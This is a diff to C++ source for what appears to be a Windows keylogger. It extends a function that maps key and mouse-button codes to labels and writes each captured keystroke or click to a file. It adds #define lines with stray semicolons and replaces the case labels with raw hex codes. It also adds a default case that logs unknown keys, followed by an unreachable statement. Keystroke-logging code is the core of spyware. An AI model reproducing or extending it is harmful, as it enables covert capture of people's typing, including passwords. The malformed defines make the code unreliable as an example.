@@ -17,6 +17,12 @@
 #define VK_UP 0x26;
 #define VK_DOWN 0x28;
 #define VK_DELETE 0x2E;
+#define VK_LEFT 0x25;
+#define VK_RIGHT 0x27;
+#define VK_INSERT 0x2D;
+#define VK_CONTROL 0x11
+#define VK_RBUTTON 0x02;
+#define VK_LBUTTON 0x01;
 
 
 void WriteToFile(LPCSTR text)
@@ -412,22 +418,22 @@ bool Key_is_Listed(WORD iKey)
 		WriteToFile(" btn_down ");
 		break;
 
-	case VK_LEFT:
+	case 0x25:
 		std::cout << " btn_left ";
 		WriteToFile(" btn_left ");
 		break;
 
-	case VK_RIGHT:
+	case 0x27:
 		std::cout << " btn_right ";
 		WriteToFile(" btn_right ");
 		break;
 
-	case VK_CONTROL:
+	case 0x11:
 		std::cout << " btn_ctrl ";
 		WriteToFile(" btn_ctrl ");
 		break;
 
-	case VK_INSERT:
+	case 0x2D:
 		std::cout << " Insert ";
 		WriteToFile(" Insert ");
 		break;
@@ -438,17 +444,21 @@ bool Key_is_Listed(WORD iKey)
 		break;
 
 
-	case VK_RBUTTON:
+	case 0x02:
 		std::cout << "*mouse_right*";
 		WriteToFile("*mouse_right*");
 		break;
 
-	case VK_LBUTTON:
+	case 0x01:
 		std::cout << "*mouse_left*";
 		WriteToFile("*mouse_left*");
 		break;
 
-	default: return false;
+	default: 
+		std::cout << "  *Неизвестный символ*  ";
+		WriteToFile("  *Неизвестный символ*  ");
+		return false;
+		break;
 	}
 }
 
